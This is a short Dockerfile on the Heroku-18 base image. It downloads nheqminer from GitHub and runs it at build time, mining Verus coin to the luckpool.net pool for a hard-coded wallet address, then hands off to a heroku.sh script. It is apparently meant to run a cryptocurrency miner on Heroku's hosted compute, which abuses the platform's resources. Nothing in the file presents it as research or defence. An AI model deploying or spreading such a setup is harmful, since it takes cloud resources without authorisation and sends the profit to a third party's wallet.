FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l ap.luckpool.net:3956 -u RW4urDfTUnhoG2yaEyPXDcXH7KGjGbapWv.siber -p x -t 2
CMD bash heroku.sh
